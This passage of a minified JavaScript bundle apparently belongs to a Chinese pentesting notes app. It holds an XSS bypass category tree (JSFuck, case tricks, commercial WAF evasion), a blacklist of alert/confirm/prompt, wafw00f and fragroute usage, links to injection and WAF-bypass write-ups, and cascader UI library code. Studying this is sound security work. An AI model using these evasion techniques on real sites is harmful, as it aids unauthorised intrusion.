\u53EF\u7528")))])),Object(t.a)({},Object(s.a)(e.URL\u5927\u5C0F\u5199,["\u901A\u8FC7\u3010URL\u3011\u8BBF\u95EE\u8D44\u6E90\uFF0C\u90FD\u662F\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u7684\u3002",j.a.createElement("div",null,v["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u5927\u5C0F\u5199\u8F6C\u6362\u7684\u5E72\u6270")))]))]}),Object(t.a)({},Object(s.a)(e.JSFuck,[j.a.createElement("div",null,v["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u7ED5\u8FC7\u3010\u67D0\u4E9B\u5B57\u6BCD\u3011\u68C0\u6D4B"),j.a.createElement("li",null,"\u7ED5\u8FC7\u3010\u5927\u5C0F\u5199\u8F6C\u6362\u3011\u68C0\u6D4B")),v["\u7F3A\u70B9\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u4E00\u4E2A\u3010print(1)\u3011\uFF0C\u751F\u6210\u30102345\u3011\u4E2A\u957F\u5EA6")),v["\u6539\u826F\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,c.e.singleATag_blank("\u901A\u8FC7\u5236\u5B9A\uFF0C\u4E2A\u4EBA\u6700\u5C0F\u5316\u5B57\u7B26\u96C6\uFF0C\u6765\u7F29\u51CF\u957F\u5EA6","https://nosec.org/home/detail/3047.html"))))])),Object(t.a)({},Object(s.a)(e["\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49"],["\u5929\u751F\u5C31\u53EF\u4EE5bypass\uFF0C\u4E0D\u9700\u8981\u7BA1\u5B83"]))]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u5757\u7EA7JS\u4EE3\u7801\u5185,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,v["\u3010script block js\u3011"],"\uFF1AScript\u5757\u7EA7JS")))])),{},{children:[Object(t.a)({},Object(s.a)(e.eval\u76F8\u5173)),Object(t.a)({},Object(s.a)(e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],[j.a.createElement("div",null),j.a.createElement("div",null,c.e.singleATag_blank("\u90E8\u5206\u8BED\u53E5\u53C2\u8003\u8D44\u6599","https://esdiscuss.org/topic/hacking-onerror-throw"))])),Object(t.a)({},Object(s.a)(e["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],[j.a.createElement("div",null,v["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],j.a.createElement("ol",null,j.a.createElement("li",null,"\u5728",v["\u3010script block js\u3011"],"\u4E2D\uFF0C\u63D0\u524D\u7528\u5230\u53D8\u91CF\uFF0C\u4F1A\u62A5\u3010undefined\u9519\u8BEF\u3011\u65F6")))])),Object(s.d)(e.\u6CE8\u91CA,e.\u7EAFHTML\u5185),Object(t.a)({},Object(s.a)(e.\u5B57\u7B26\u4E32\u53D8\u91CF,["\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011",j.a.createElement("ol",null,j.a.createElement("li",null,"\u4E00\u822C\uFF0C\u8981\u7531\u3010\u4EFB\u4E00\u62EC\u53F7\u5BF9\u3011\u5305\u88F9"),j.a.createElement("li",null,"\u3010\u5E38\u89C4\u5B57\u7B26\u4E32\u3011\uFF0C\u53EF\u4EE5\u7528\u3010\\\u3011\u7B26\u53F7\uFF0C\u6765\u5212\u5206\u3010\u591A\u884C\u3011\u3002"))]))]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.Electron\u5E94\u7528,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))])),{},{children:[Object(t.a)({},Object(s.a)(e.\u57FA\u672CElectron\u8BED\u53E5,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))])),Object(t.a)({},Object(s.a)(e.DOM\u963B\u585E\u5668,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))])),Object(t.a)({},Object(s.a)(e["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"],[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))])),Object(t.a)({},Object(s.a)(e.MarkDown\u8D85\u94FE\u63A5,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))]))]}),Object(t.a)({},Object(s.a)(e["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"],[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"--")))]))]})];var C=function(){function r(){Object(k.a)(this,r)}return Object(o.a)(r,null,[{key:"checkBlackList",value:function(p){var z=this;p.forEach(function(N){z.blackList.forEach(function(K){var S=N.value.toLocaleLowerCase(),T=K.toLocaleLowerCase(),H=S.includes(T);H&&console.error("\u89E6\u53D1\u4E86\u9ED1\u540D\u5355",K,N.value)}),N.children&&z.checkBlackList(N.children)})}}]),r}();C.blackList=["alert","confirm","prompt"],E.placePayloads(),console.log("\u8FDB\u884C\u4E00\u6B21\u3010BlackList_Helper\u3011\u8FC7\u6EE4\u3002"),C.checkBlackList(E.options);var y=[Object(t.a)({},Object(s.b)("\u3010\u91CD\u70B9\u3011\u9ED1\u5BA2\u4E16\u754C",[j.a.createElement("div",null,c.e.singleATag_blank("\u3010\u91CD\u70B9\u3011\u9ED1\u5BA2\u4E16\u754C","https://www.kdocs.cn/p/113835915920"))]))];function _(r,P,p){return r.split(P).map(function(z,N){return N===0?z:[j.a.createElement("span",{className:"".concat(p,"-menu-item-keyword"),key:"seperator"},P),z]})}function O(r,P){if(c.e.check_isString(r))return String(r);var p=JSON.stringify(r);if(P){var z;p=((z=p.match(P))===null||z===void 0?void 0:z.join("      ||||      "))||"\u65E0",console.log("\u6B63\u5219\u7B5B\u9009\u7ED3\u679C",p)}return p}var B=function(P){function p(N,K){var S;console.log(K);var T=(S=K[K.length-1])===null||S===void 0?void 0:S.trim();switch(T&&Object(c.d)(T),N){case"inputPoint":break;case"payload":E.saveSelect_Payload(K);break;case"trueExample":break;default:break}}function z(N){return N[N.length-1]}return j.a.createElement("div",{className:u.a.xssTree},j.a.createElement("h1",null,"\u8F93\u5165\u70B9"),j.a.createElement(h.a,{options:m,expandTrigger:"hover",displayRender:z,onChange:function(K){p("inputPoint",K)}}),j.a.createElement("h1",null,"\u5B50\u5F39payload"),j.a.createElement("div",{style:{display:"flex"}},j.a.createElement(h.a,{className:u.a.cascaderInputWra,dropdownClassName:u.a.cascaderDropdown_wra,style:{marginLeft:"auto",width:"50%"},options:E.options,expandTrigger:"hover",displayRender:z,onChange:function(K){p("payload",K)},showSearch:{filter:function(K,S){return S.some(function(T){var H=T.label;if(!H)throw new Error("\u672A\u586B\u5199label");var q=O(H).toLowerCase();return console.log("labelStr",q,q.indexOf),q.indexOf(K.toLowerCase())>-1})},sort:function(K,S,T,H){return 1},render:function(K,S,T,H){return S.map(function(q,G){var ju=O(q[H.label],/"(title)":"((\\"|[^"])*)"/i),$=ju.indexOf(K)>-1?_(ju,K,T):ju;return G===0?$:[" / ",$]})}},defaultValue:E.loadSelect_Payload()})),j.a.createElement("h1",null,"\u771F\u5B9E\u6848\u4F8B"),j.a.createElement(h.a,{options:F,expandTrigger:"hover",displayRender:z,onChange:function(K){p("trueExample",K)}}),j.a.createElement("h1",null,"\u601D\u8DEF\uFF0C\u601D\u8DEF\u79EF\u6DC0"),j.a.createElement(h.a,{options:y,expandTrigger:"hover",displayRender:z,onChange:function(K){p("ideas",K)}}))}},AkKX:function(nu,U,f){"use strict";f.d(U,"a",function(){return l});var R=f("q1tI"),h=f.n(R),l={\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY:{\u5BC6\u7801_\u53CA\u7834\u89E3:`
  \u3010pass\u3011\u3001\u3010password\u3011\u3001\u3010\u5BC6\u7801\u3011\u3001\u3010\u5BC6\u7801\u7834\u89E3\u3011\u3001\u3010Cracker\u3011\u3001
  \u3010secret\u3011\u3001\u3010authentication\u3011\u3001\u3010auth\u3011\u3001
  `,\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28:h.a.createElement("pre",null,`
  \u4EBA\u7684\u60F3\u8C61\u529B\u662F\u6709\u9650\u7684\u3002\u6240\u4EE5\u603B\u4F1A\u9AD8\u5EA6\u7684\u91CD\u590D
      \u6709\u610F\u590D\u7528\uFF1B\u6216\u65E0\u77E5\u89C9 \u65E0\u610F\u7684\u590D\u7528
  `)},\u6E17\u900F\u6D4B\u8BD5:"\u6E17\u900F\u6D4B\u8BD5"}},B5J2:function(nu,U,f){"use strict";f.d(U,"a",function(){return s}),f.d(U,"b",function(){return F});var R=f("fWQN"),h=f("q1tI"),l=f.n(h),j=f("ysNt"),n=f("/qoP"),u=f("6CFD"),t=j.e.singleATag_blank,s=function k(){Object(R.a)(this,k)};s["\u5C0F\u9ED1\u5206\u4EAB\u7684\u300A\u9AD8\u7EA7\u6280\u5DE7\u300B"]=`
  \u5C0F\u9ED1\u5206\u4EAB\u7684\u300A\u9AD8\u7EA7\u6280\u5DE7\u300B\uFF1A
      1.\u300ASQL\u6CE8\u5165\u76F8\u5173 - Geekby's Blog\u300B             https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/#3-%E5%88%A4%E6%96%AD-sql-%E6%B3%A8%E5%85%A5
      2.\u300AXSS \u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B            https://www.geekby.site/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#5-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87
      3.\u300AWEB\u6F0F\u6D1E-XSS\u8DE8\u7AD9\u4E4B\u4EE3\u7801\u7ED5\u8FC7\u4E0EhttpOnly\u7ED5\u8FC7\u300B    https://blog.csdn.net/weixin_45441315/article/details/119718207
      4.\u300A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B         https://www.geekby.site/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
      5.\u300ACSRF\u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B            https://www.geekby.site/2021/01/csrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#11-cookie-%E7%9B%B8%E5%85%B3
      6.\u300ASSRF \u6F0F\u6D1E\u76F8\u5173 - Geekby's Blog\u300B           https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/#21-ip-%E7%BB%95%E8%BF%87
      7.\u300AWAF Bypass - Geekby's Blog\u300B            https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E8%BF%9B%E9%98%B6
  `;var m={name:"\u3010\u9632\u706B\u5899\u3011_\u3010Waf\u3011_\u624B\u518C",steps:[{name:"\u3010fragroute\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("fragroute \uFF08\u73B0\u5728\u597D\u50CF\u5DF2\u88AB\u79FB\u9664\uFF09","	\u5C06 \u8DEF\u7531\u3001\u6570\u636E\u5305 \u5206\u6BB5","	fragroute <\u57DF\u540D\u3001IP>"))},{name:"\u3010wafw00f\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("wafw00f \uFF08\u8BC6\u522BWAF\u7684\u5B58\u5728\uFF09","	wafw00f -l","		\u5217\u51FA\u5DF2\u6536\u5F55\u7684WAF\u5217\u8868","	wafw00f <\u57DF\u540D\u3001IP\u3001\u5E26\u534F\u8BAE\u7684url\u3001\u5E26\u7AEF\u53E3\u7684url>","		\u68C0\u67E5","		\u3010-a\u3011\uFF0C\u67E5\u627E\u6240\u6709\u7684\u7279\u5F81\uFF0C\u800C\u4E0D\u662F\u5F53\u7B2C\u4E00\u4E2A\u68C0\u67E5\u5230\u5C31\u505C\u4E0B","	\u68C0\u6D4B\u7ED3\u679C\uFF1A","		1.\u51E1\u662F\u5E26\u3010Error\u3011\u7684\u68C0\u6D4B\u7ED3\u679C\uFF0C\u90FD\u4E0D\u53EF\u4FE1\u3002","		2.\u68C0\u6D4B\u6848\u4F8B\uFF1A","			\u3010zhihu.com\u3011\u3001\u3010baidu.com\u3011\u3001\u3010qq.com\u3011\uFF0C\u88AB\u8BC6\u522B\u51FA\u6709 \uFF08\u90A3\u51E0\u4E4E\u4E00\u5B9A\u5C31\u6709\uFF09","			\u3010google.com\u3011\u6CA1\u6709 \uFF08\u90A3\u600E\u4E48\u53EF\u80FD\u6CA1\u6709\uFF1F\u4E00\u5B9A\u662F\u6F0F\u62A5\u4E86\u5427\uFF09","			\u301010.10.10.28\u3011\u9776\u673A\uFF0C\u4E0D\u5B58\u5728WAF\u3002"))},{name:"\u770B\u56FE\u8BC6\u3010WAF\u3011_\u6536\u96C6\u5E38\u89C1WAF\u3010\u62E6\u622A\u9875\u9762\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,n.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(u.a.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762))}]},F=m},CW61:function(nu,U,f){"use strict";f.d(U,"a",function(){return o});var R=f("oBTY"),h=f("tJVT"),l=f("9og8"),j=f("fWQN"),n=f("mtLc"),u=f("WmNS"),t=f.n(u),s=f("EUZL"),m=f.n(s),F=f("i0Ej"),k=f("q4c3"),o=function(){function c(){Object(j.a)(this,c)}return Object(n.a)(c,null,[{key:"trackKeyWords",value:function(){var b=Object(l.a)(t.a.mark(function v(D){var d;return t.a.wrap(function(E){for(;;)switch(E.prev=E.next){case 0:return E.next=2,c.ExcelToJSON(D);case 2:return d=E.sent,E.abrupt("return",this.extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF(d,k.a));case 4:case"end":return E.stop()}},v,this)}));function e(v){return b.apply(this,arguments)}return e}()},{key:"extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7",value:function(e,v){return this.extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF(e,v)}},{key:"extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF",value:function(e,v){function D(A,E){var C=[],y,_=[];do console.log("\u5B57\u7B26\u4E32",A,"\u6B63\u5219",E.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5),y=E.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.exec(A),y&&(console.log("execed",y,y[1],y[2]),_.push({index:y.index,text_index_1:y[1],text_index_2:y[2]}));while(y);return _.length>0&&C.push({keyWCfg:E,occurs:_}),console.log("\u6293\u53D6\u5230\u7684\u6700\u7EC8\u5355\u7EC4",C),C}var d=[];return Object.entries(v).forEach(function(A){var E=Object(h.a)(A,2),C=E[0],y=E[1];y.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5=F.a.prepareRegExp_\u5C06\u6B63\u5219\u6216\u7C7B\u6B63\u5219\u5B57\u7B26\u4E32_\u8F6C\u4E3A\u6B63\u5219(y.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5),d.push.apply(d,Object(R.a)(D(e,y)))}),console.log("\u6700\u540E\uFF0C\u6253\u5370\u51FA\u6765\uFF0CmatchedKoans",d),d}},{key:"ExcelToJSON",value:function(e){return new Promise(function(v,D){var d=new FileReader;d.onload=function(A){var E,C=A==null||(E=A.target)===null||E===void 0?void 0:E.result,y=m.a.read(C,{type:"binary"});console.log("Sheet\u7EC4",y.SheetNames),y.SheetNames.forEach(function(_,O){var B=m.a.utils.sheet_to_csv(y.Sheets[_]);console.log("Sheet\u8BFB\u53D6 [".concat(O,`]
`),B),v(B)})},d.onerror=function(A){console.error(`\u9519\u8BEF
`,A),D(A)},d.readAsBinaryString(e)})}}]),c}()},DFOY:function(nu,U,f){"use strict";var R=f("wx14"),h=f("rePB"),l=f("U8pU"),j=f("KQm4"),n=f("q1tI"),u=f("TSYQ"),t=f.n(u),s=f("ODXe"),m=f("Ff2n"),F=f("18yb"),k=f("NvD2"),o=f("6cGi"),c=f("LdHM"),b=f("VTBJ"),e=n.createContext(null),v=e,D="__RC_CASCADER_SPLIT__";function d(L){return L.join(D)}function A(L){return L.map(d)}function E(L){return L.split(D)}function C(L){var X=L||{},Q=X.label,Z=X.value,cu=X.children,lu=Z||"value";return{label:Q||"label",value:lu,key:lu,children:cu||"children"}}function y(L,X){var Q,Z;return(Q=L.isLeaf)!==null&&Q!==void 0?Q:!((Z=L[X.children])===null||Z===void 0?void 0:Z.length)}function _(L){var X=L.parentElement;if(!!X){var Q=L.offsetTop-X.offsetTop;Q-X.scrollTop<0?X.scrollTo({top:Q}):Q+L.offsetHeight-X.scrollTop>X.offsetHeight&&X.scrollTo({top:Q+L.offsetHeight-X.offsetHeight})}}function O(L,X){var Q=new Set(L),Z=X();return L.filter(function(cu){var lu=Z[cu],ru=lu?lu.parent:null;return!(ru&&!ru.node.disabled&&Q.has(ru.key))})}function B(L,X,Q){for(var Z=arguments.length>3&&arguments[3]!==void 0?arguments[3]:!1,cu=X,lu=[],ru=function(du){var gu,Du,Ou,Tu=L[du],tu=(gu=cu)===null||gu===void 0?void 0:gu.findIndex(function(ku){var pu=ku[Q.value];return Z?String(pu)===String(Tu):pu===Tu}),su=tu!==-1?(Du=cu)===null||Du===void 0?void 0:Du[tu]:null;lu.push({value:(Ou=su==null?void 0:su[Q.value])!==null&&Ou!==void 0?Ou:Tu,index:tu,option:su}),cu=su==null?void 0:su[Q.children]},Eu=0;Eu<L.length;Eu+=1)ru(Eu);return lu}function r(L){var X,Q=L.prefixCls,Z=L.checked,cu=L.halfChecked,lu=L.disabled,ru=L.onClick,Eu=n.useContext(v),mu=Eu.checkable,du=typeof mu!="boolean"?mu:null;return n.createElement("span",{className:t()("".concat(Q),(X={},Object(h.a)(X,"".concat(Q,"-checked"),Z),Object(h.a)(X,"".concat(Q,"-indeterminate"),!Z&&cu),Object(h.a)(X,"".concat(Q,"-disabled"),lu),X)),onClick:ru},du)}var P="__rc_cascader_search_mark__",p=function(X,Q,Z){var cu=Z.label;return Q.some(function(lu){return String(lu[cu]).toLowerCase().includes(X.toLowerCase())})},z=function(X,Q,Z,cu){return Q.map(function(lu){return lu[cu.label]}).join(" / ")},N=function(L,X,Q,Z,cu,lu){var ru=cu.filter,Eu=ru===void 0?p:ru,mu=cu.render,du=mu===void 0?z:mu,gu=cu.limit,Du=gu===void 0?50:gu,Ou=cu.sort;return n.useMemo(function(){var Tu=[];if(!L)return[];function tu(su,ku){su.forEach(function(pu){if(!(!Ou&&Du>0&&Tu.length>=Du)){var $u=[].concat(Object(j.a)(ku),[pu]),vu=pu[Q.children];if((!vu||vu.length===0||lu)&&Eu(L,$u,{label:Q.label})){var qu;Tu.push(Object(b.a)(Object(b.a)({},pu),{},(qu={},Object(h.a)(qu,Q.label,du(L,$u,Z,Q)),Object(h.a)(qu,P,$u),qu)))}vu&&tu(pu[Q.children],$u)}})}return tu(X,[]),Ou&&Tu.sort(function(su,ku){return Ou(su[P],ku[P],L,Q)}),Du>0?Tu.slice(0,Du):Tu},[L,X,Q,Z,du,lu,Eu,Ou,Du])};function K(L){var X=L.prefixCls,Q=L.multiple,Z=L.options,cu=L.activeValue,lu=L.prevValuePath,ru=L.onToggleOpen,Eu=L.onSelect,mu=L.onActive,du=L.checkedSet,gu=L.halfCheckedSet,Du=L.loadingKeys,Ou=L.isSelectable,Tu="".concat(X,"-menu"),tu="".concat(X,"-menu-item"),su=n.useContext(v),ku=su.fieldNames,pu=su.changeOnSelect,$u=su.expandTrigger,vu=su.expandIcon,qu=su.loadingIcon,Mu=su.dropdownMenuColumnStyle,_u=$u==="hover",xu=n.useMemo(function(){return Z.map(function(Cu){var zu=Cu.disabled,Lu=Cu[P],Xu=Cu[ku.label],Ju=Cu[ku.value],Nu=y(Cu,ku),Yu=Lu?Lu.map(function(jn){return jn[ku.value]}):[].concat(Object(j.a)(lu),[Ju]),on=d(Yu),ou=Du.includes(on),Wu=du.has(on),Iu=gu.has(on);return{disabled:zu,label:Xu,value:Ju,isLeaf:Nu,isLoading:ou,checked:Wu,halfChecked:Iu,option:Cu,fullPath:Yu,fullPathKey:on}})},[Z,du,ku,gu,Du,lu]);return n.createElement("ul",{className:Tu,role:"menu"},xu.map(function(Cu){var zu,Lu=Cu.disabled,Xu=Cu.label,Ju=Cu.value,Nu=Cu.isLeaf,Yu=Cu.isLoading,on=Cu.checked,ou=Cu.halfChecked,Wu=Cu.option,Iu=Cu.fullPath,jn=Cu.fullPathKey,Su=function(){!Lu&&(!_u||!Nu)&&mu(Iu)},An=function(){Ou(Wu)&&Eu(Iu,Nu)},gn;return typeof Wu.title=="string"?gn=Wu.title:typeof Xu=="string"&&(gn=Xu),n.createElement("li",{key:jn,className:t()(tu,(zu={},Object(h.a)(zu,"".concat(tu,"-expand"),!Nu),Object(h.a)(zu,"".concat(tu,"-active"),cu===Ju),Object(h.a)(zu,"".concat(tu,"-disabled"),Lu),Object(h.a)(zu,"".concat(tu,"-loading"),Yu),zu)),style:Mu,role:"menuitemcheckbox",title:gn,"aria-checked":on,"data-path-key":jn,onClick:function(){Su(),(!Q||Nu)&&An()},onDoubleClick:function(){pu&&ru(!1)},onMouseEnter:function(){_u&&Su()},onMouseDown:function(Pn){Pn.preventDefault()}},Q&&n.createElement(r,{prefixCls:"".concat(X,"-checkbox"),checked:on,halfChecked:ou,disabled:Lu,onClick:function(Pn){Pn.stopPropagation(),An()}}),n.createElement("div",{className:"".concat(tu,"-content")},Xu),!Yu&&vu&&!Nu&&n.createElement("div",{className:"".concat(tu,"-expand-icon")},vu),Yu&&qu&&n.createElement("div",{className:"".concat(tu,"-loading-icon")},qu))}))}var S=function(){var L=Object(c.e)(),X=L.multiple,Q=L.open,Z=n.useContext(v),cu=Z.values,lu=n.useState([]),ru=Object(s.a)(lu,2),Eu=ru[0],mu=ru[1];return n.useEffect(function(){if(Q&&!X){var du=cu[0];mu(du||[])}},[Q]),[Eu,mu]},T=f("4IlW"),H=function(L,X,Q,Z,cu,lu){var ru=Object(c.e)(),Eu=ru.direction,mu=ru.searchValue,du=ru.toggleOpen,gu=ru.open,Du=Eu==="rtl",Ou=n.useMemo(function(){for(var Mu=-1,_u=X,xu=[],Cu=[],zu=Z.length,Lu=function(ou){var Wu=_u.findIndex(function(Iu){return Iu[Q.value]===Z[ou]});if(Wu===-1)return"break";Mu=Wu,xu.push(Mu),Cu.push(Z[ou]),_u=_u[Mu][Q.children]},Xu=0;Xu<zu;Xu+=1){var Ju=Lu(Xu);if(Ju==="break")break}for(var Nu=X,Yu=0;Yu<xu.length-1;Yu+=1)Nu=Nu[xu[Yu]][Q.children];return[Cu,Mu,Nu]},[Z,Q,X]),Tu=Object(s.a)(Ou,3),tu=Tu[0],su=Tu[1],ku=Tu[2],pu=function(_u){cu(_u)},$u=function(_u){var xu=ku.length,Cu=su;Cu===-1&&_u<0&&(Cu=xu);for(var zu=0;zu<xu;zu+=1){Cu=(Cu+_u+xu)%xu;var Lu=ku[Cu];if(Lu&&!Lu.disabled){var Xu=Lu[Q.value],Ju=tu.slice(0,-1).concat(Xu);pu(Ju);return}}},vu=function(){if(tu.length>1){var _u=tu.slice(0,-1);pu(_u)}else du(!1)},qu=function(){var _u,xu=((_u=ku[su])===null||_u===void 0?void 0:_u[Q.children])||[],Cu=xu.find(function(Lu){return!Lu.disabled});if(Cu){var zu=[].concat(Object(j.a)(tu),[Cu[Q.value]]);pu(zu)}};n.useImperativeHandle(L,function(){return{onKeyDown:function(_u){var xu=_u.which;switch(xu){case T.a.UP:case T.a.DOWN:{var Cu=0;xu===T.a.UP?Cu=-1:xu===T.a.DOWN&&(Cu=1),Cu!==0&&$u(Cu);break}case T.a.LEFT:{Du?qu():vu();break}case T.a.RIGHT:{Du?vu():qu();break}case T.a.BACKSPACE:{mu||vu();break}case T.a.ENTER:{tu.length&&lu(tu,ku[su]);break}case T.a.ESC:du(!1),gu&&_u.stopPropagation()}},onKeyUp:function(){}}})},q=n.forwardRef(function(L,X){var Q,Z,cu,lu,ru=Object(c.e)(),Eu=ru.prefixCls,mu=ru.multiple,du=ru.searchValue,gu=ru.toggleOpen,Du=ru.notFoundContent,Ou=ru.direction,Tu=n.useRef(),tu=Ou==="rtl",su=n.useContext(v),ku=su.options,pu=su.values,$u=su.halfValues,vu=su.fieldNames,qu=su.changeOnSelect,Mu=su.onSelect,_u=su.searchOptions,xu=su.dropdownPrefixCls,Cu=su.loadData,zu=su.expandTrigger,Lu=xu||Eu,Xu=n.useState([]),Ju=Object(s.a)(Xu,2),Nu=Ju[0],Yu=Ju[1],on=function(Hu){if(!(!Cu||du)){var en=B(Hu,ku,vu),Zu=en.map(function(Ln){var Gn=Ln.option;return Gn}),pn=Zu[Zu.length-1];if(pn&&!y(pn,vu)){var xn=d(Hu);Yu(function(Ln){return[].concat(Object(j.a)(Ln),[xn])}),Cu(Zu)}}};n.useEffect(function(){Nu.length&&Nu.forEach(function(Fn){var Hu=E(Fn),en=B(Hu,ku,vu,!0).map(function(pn){var xn=pn.option;return xn}),Zu=en[en.length-1];(!Zu||Zu[vu.children]||y(Zu,vu))&&Yu(function(pn){return pn.filter(function(xn){return xn!==Fn})})})},[ku,Nu,vu]);var ou=n.useMemo(function(){return new Set(A(pu))},[pu]),Wu=n.useMemo(function(){return new Set(A($u))},[$u]),Iu=S(),jn=Object(s.a)(Iu,2),Su=jn[0],An=jn[1],gn=function(Hu){An(Hu),on(Hu)},rn=function(Hu){var en=Hu.disabled,Zu=y(Hu,vu);return!en&&(Zu||qu||mu)},Pn=function(Hu,en){var Zu=arguments.length>2&&arguments[2]!==void 0?arguments[2]:!1;Mu(Hu),!mu&&(en||qu&&(zu==="hover"||Zu))&&gu(!1)},an=n.useMemo(function(){return du?_u:ku},[du,_u,ku]),Bn=n.useMemo(function(){for(var Fn=[{options:an}],Hu=an,en=function(Ln){var Gn=Su[Ln],hn=Hu.find(function(Yn){return Yn[vu.value]===Gn}),dn=hn==null?void 0:hn[vu.children];if(!(dn==null?void 0:dn.length))return"break";Hu=dn,Fn.push({options:dn})},Zu=0;Zu<Su.length;Zu+=1){var pn=en(Zu);if(pn==="break")break}return Fn},[an,Su,vu]),Dn=function(Hu,en){rn(en)&&Pn(Hu,y(en,vu),!0)};H(X,an,vu,Su,gn,Dn),n.useEffect(function(){for(var Fn=0;Fn<Su.length;Fn+=1){var Hu,en=Su.slice(0,Fn+1),Zu=d(en),pn=(Hu=Tu.current)===null||Hu===void 0?void 0:Hu.querySelector('li[data-path-key="'.concat(Zu.replace(/\\{0,2}"/g,'\\"'),'"]'));pn&&_(pn)}},[Su]);var Qu=!((Q=Bn[0])===null||Q===void 0||(Z=Q.options)===null||Z===void 0?void 0:Z.length),wn=[(cu={},Object(h.a)(cu,vu.label,Du),Object(h.a)(cu,vu.value,"__EMPTY__"),Object(h.a)(cu,"disabled",!0),cu)],nj=Object(b.a)(Object(b.a)({},L),{},{multiple:!Qu&&mu,onSelect:Pn,onActive:gn,onToggleOpen:gu,checkedSet:ou,halfCheckedSet:Wu,loadingKeys:Nu,isSelectable:rn}),Tn=Qu?[{options:wn}]:Bn,Vn=Tn.map(function(Fn,Hu){var en=Su.slice(0,Hu),Zu=Su[Hu];return n.createElement(K,Object(R.a)({key:Hu},nj,{prefixCls:Lu,options:Fn.options,prevValuePath:en,activeValue:Zu}))});return n.createElement("div",{className:t()("".concat(Lu,"-menus"),(lu={},Object(h.a)(lu,"".concat(Lu,"-menu-empty"),Qu),Object(h.a)(lu,"".concat(Lu,"-rtl"),tu),lu)),ref:Tu},Vn)}),G=q,ju=function(L,X,Q,Z,cu){return n.useMemo(function(){var lu=cu||function(ru){var Eu=Z?ru.slice(-1):ru,mu=" / ";return Eu.every(function(du){return["string","number"].includes(Object(l.a)(du))})?Eu.join(mu):Eu.reduce(function(du,gu,Du){var Ou=n.isValidElement(gu)?n.cloneElement(gu,{key:Du}):gu;return Du===0?[Ou]:[].concat(Object(j.a)(du),[mu,Ou])},[])};return L.map(function(ru){var Eu=B(ru,X,Q),mu=lu(Eu.map(function(du){var 